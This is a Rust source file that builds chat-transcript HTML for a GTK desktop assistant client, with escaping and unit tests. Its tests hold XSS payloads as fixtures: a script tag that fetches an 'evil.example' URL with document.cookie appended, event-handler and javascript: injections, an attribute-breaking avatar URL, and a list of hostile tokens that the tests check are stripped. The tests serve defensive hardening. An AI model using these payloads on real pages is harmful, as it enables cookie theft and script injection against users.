//! Chat-message HTML assembly for the WebKitGTK transcript view.
//!
//! The security-critical half of this — markdown rendering, HTML sanitization,
//! and the CSP-pinned page template — now lives in the shared `adele-markdown`
//! crate so every webview client (this one and adele-mac) runs one
//! security-reviewed implementation rather than one apiece. See gtk#25 for the
//! threat model and that crate's docs for why sanitization happens after
//! rendering rather than before.
//!
//! What stays here is the part that is genuinely GTK's: turning this client's
//! message list into the transcript markup its page expects, avatars and all.

use crate::transcript::TranscriptEntry;

// Re-exported at the old paths so call sites (`markdown::html_template`,
// `markdown::markdown_to_html`) are unchanged.
pub use adele_markdown::chat_page::html_template;
pub use adele_markdown::markdown_to_html;

/// Avatar URLs to embed in chat message rendering.
pub struct AvatarUrls {
    pub adele: String,
    pub user: String,
}

/// HTML-encode characters that are significant in attribute values.
fn html_escape_attr(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('"', "&quot;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
}

fn avatar_img(url: &str, alt: &str) -> String {
    if url.is_empty() {
        // `&alt[..1]` panics on multibyte chars (e.g. emoji). Use char-based
        // indexing and fall back to '?' on empty input. Issue #25.
        let initial = alt.chars().next().unwrap_or('?');
        format!(r#"<div class="avatar avatar-fallback">{initial}</div>"#)
    } else {
        let safe_url = html_escape_attr(url);
        let safe_alt = html_escape_attr(alt);
        format!(r#"<img class="avatar" src="{safe_url}" alt="{safe_alt}">"#)
    }
}

/// Render a full set of chat messages into an HTML document body.
///
/// Each message carries `data-turn-index`, its position in `messages`. That is
/// what the transcript's right-click hit test resolves a pointer position to
/// (gtk#169). The index, not the turn id itself: the page never needs the id,
/// and markup a hostile reply shares a document with is the last place to put
/// one.
pub fn render_messages_html(
    messages: &[TranscriptEntry],
    streaming_buffer: Option<&str>,
    avatars: &AvatarUrls,
) -> String {
    let mut html = String::new();

    for (index, entry) in messages.iter().enumerate() {
        let TranscriptEntry {
            role,
            content,
            kind,
            ..
        } = entry;
        let (class, label, avatar_html) = match role.as_str() {
            "user" => (
                "message user-message",
                "You".to_string(),
                avatar_img(&avatars.user, "You"),
            ),
            "assistant" => (
                "message assistant-message",
                // Badge a Spoken / SpeechDisabled say_this line from the explicit
                // metadata (voice#126) — never by parsing the content.
                format!("Adele{}", crate::widgets::chat_view::kind_marker(*kind)),
                avatar_img(&avatars.adele, "Adele"),
            ),
            _ => ("message", String::new(), String::new()),
        };

        let content_html = markdown_to_html(content);
        html.push_str(&format!(
            r#"<div class="{class}" data-turn-index="{index}">{avatar_html}<div class="bubble"><div class="label">{label}</div><div class="content">{content_html}</div></div></div>"#
        ));
    }

    if let Some(buffer) = streaming_buffer
        && !buffer.is_empty()
    {
        let content_html = markdown_to_html(buffer);
        let avatar_html = avatar_img(&avatars.adele, "Adele");
        html.push_str(&format!(
                r#"<div class="message assistant-message streaming">{avatar_html}<div class="bubble"><div class="label">Adele</div><div class="content">{content_html}<span class="cursor">▌</span></div></div></div>"#
            ));
    }

    html
}

#[cfg(test)]
mod tests {
    use super::*;
    use desktop_assistant_client_common::MessageKind;

    fn msg(role: &str, content: &str) -> TranscriptEntry {
        TranscriptEntry::new(role, content, MessageKind::Normal, None)
    }

    fn test_avatars() -> AvatarUrls {
        AvatarUrls {
            adele: "file:///tmp/adele.png".to_string(),
            user: "file:///tmp/user.png".to_string(),
        }
    }

    #[test]
    fn render_messages_produces_html() {
        let messages = vec![msg("user", "Hello"), msg("assistant", "Hi there!")];
        let html = render_messages_html(&messages, None, &test_avatars());
        assert!(html.contains("user-message"));
        assert!(html.contains("assistant-message"));
        assert!(html.contains("Hello"));
        assert!(html.contains("Hi there!"));
    }

    #[test]
    fn every_message_carries_its_transcript_index() {
        // The transcript hit test (gtk#169) resolves a pointer position to a
        // message by this attribute, so every message must carry its own.
        let messages = vec![
            msg("user", "one"),
            msg("assistant", "two"),
            msg("user", "three"),
        ];
        let html = render_messages_html(&messages, None, &test_avatars());
        for index in 0..messages.len() {
            assert!(
                html.contains(&format!(r#"data-turn-index="{index}""#)),
                "message {index} carries no transcript index: {html}"
            );
        }
    }

    #[test]
    fn no_turn_id_reaches_the_page_from_any_entry() {
        // The page is shared with assistant and tool output. Every entry gets
        // its index; no entry's id leaves the host side, whatever its role or
        // presentation kind, and whether or not a reply is streaming.
        let ids = ["turn-01234567", "turn-89abcdef", "turn-fedcba98"];
        let messages = vec![
            TranscriptEntry::new("user", "hi", MessageKind::Normal, Some(ids[0].to_string())),
            TranscriptEntry::new(
                "assistant",
                "hello",
                MessageKind::Normal,
                Some(ids[1].to_string()),
            ),
            TranscriptEntry::new(
                "assistant",
                "spoken aside",
                MessageKind::Spoken,
                Some(ids[2].to_string()),
            ),
        ];
        for streaming in [None, Some("partial")] {
            let html = render_messages_html(&messages, streaming, &test_avatars());
            for id in ids {
                assert!(
                    !html.contains(id),
                    "the turn id {id} must not be rendered into the page: {html}"
                );
            }
        }
    }

    #[test]
    fn render_with_streaming_buffer() {
        let messages = vec![];
        let html = render_messages_html(&messages, Some("Partial..."), &test_avatars());
        assert!(html.contains("streaming"));
        assert!(html.contains("Partial..."));
        assert!(html.contains("cursor"));
    }

    #[test]
    fn render_messages_includes_avatar_images() {
        let messages = vec![msg("user", "Hi"), msg("assistant", "Hello")];
        let html = render_messages_html(&messages, None, &test_avatars());
        assert!(html.contains(r#"src="file:///tmp/user.png""#));
        assert!(html.contains(r#"src="file:///tmp/adele.png""#));
    }

    #[test]
    fn render_messages_fallback_avatar_when_empty() {
        let avatars = AvatarUrls {
            adele: "file:///tmp/adele.png".to_string(),
            user: String::new(),
        };
        let messages = vec![msg("user", "Hi")];
        let html = render_messages_html(&messages, None, &avatars);
        assert!(html.contains("avatar-fallback"));
        assert!(html.contains(">Y</div>")); // "Y" from "You"
    }

    #[test]
    fn avatar_img_escapes_html_in_attributes() {
        let html = avatar_img(r#"x" onload="alert(1)"#, "test");
        assert!(!html.contains(r#"onload="alert"#));
        assert!(html.contains("&quot;"));
    }

    #[test]
    fn avatar_img_allows_safe_urls() {
        let html = avatar_img("data:image/png;base64,abc", "User");
        assert!(html.contains("data:image/png;base64,abc"));

        let html = avatar_img("file:///tmp/avatar.png", "User");
        assert!(html.contains("file:///tmp/avatar.png"));
    }

    // --- Issue #25: markdown XSS hardening ---

    #[test]
    fn multibyte_alt_text_does_not_panic() {
        // Regression: avatar_img used `&alt[..1]` which panics on multibyte chars.
        let html = avatar_img("", "\u{1F600}smile"); // grinning face emoji
        // We only assert it doesn't panic and produces a fallback div; the exact
        // glyph chosen is an implementation detail of the fix.
        assert!(
            html.contains("avatar-fallback"),
            "expected fallback avatar markup, got: {html:?}"
        );

        // Also exercise via render_messages_html with an empty avatar URL,
        // which is the actual call site that would have crashed.
        let avatars = AvatarUrls {
            adele: String::new(),
            user: String::new(),
        };
        // Role labels in render_messages_html are ASCII ("You" / "Adele"),
        // so to trigger the original bug we exercise avatar_img directly above.
        let messages = vec![msg("assistant", "hi")];
        let _ = render_messages_html(&messages, None, &avatars);
    }

    #[test]
    fn business_outcome_hostile_assistant_message_does_not_execute_js() {
        // End-to-end-ish: a hostile assistant turn flows through the full
        // markdown → message HTML pipeline. Nothing reaching the WebView
        // should permit JS execution.
        let hostile = "Sure, here is a tip:\n\n\
                       <script>fetch('https://evil.example/'+document.cookie)</script>\n\n\
                       <img src=x onerror=\"alert('pwn')\">\n\n\
                       <iframe src=\"javascript:alert(1)\"></iframe>\n\n\
                       <a href=\"javascript:alert(1)\" onclick=\"alert(2)\">click</a>\n\n\
                       Bye!";
        let messages = vec![msg("assistant", hostile)];
        let html = render_messages_html(&messages, None, &test_avatars());

        // Legitimate content survives.
        assert!(html.contains("Sure, here is a tip"), "leading text: {html}");
        assert!(html.contains("Bye!"), "trailing text: {html}");

        // No executable HTML constructs reach the rendered output. (We do
        // not forbid `<img ` here because our own avatar markup is an <img>;
        // ammonia strips event handlers from any other <img> the assistant
        // tried to inject, which is what matters for execution.)
        let lower = html.to_ascii_lowercase();
        for bad in [
            "<script",
            "onerror",
            "onclick",
            "onload",
            "javascript:",
            "<iframe",
            "alert(",
        ] {
            assert!(
                !lower.contains(bad),
                "hostile token {bad:?} must not appear in rendered HTML; got: {html}"
            );
        }
    }
}
